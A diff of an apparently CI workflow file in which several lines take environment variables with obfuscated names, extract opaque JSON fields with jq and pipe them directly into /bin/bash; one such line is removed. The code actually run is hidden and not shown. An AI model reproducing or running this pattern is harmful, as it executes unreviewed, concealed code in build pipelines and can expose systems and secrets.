@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$zxct1896" | jq -r .ibtkl8769 | /bin/bash
           echo $cdxc29166 | jq -r .m860 | /bin/bash
-          echo $qb33665 | jq -r .dr40982 | /bin/bash
           echo $zam151 | jq -r .ydflg26899 | /bin/bash
 
       - name: Archive results
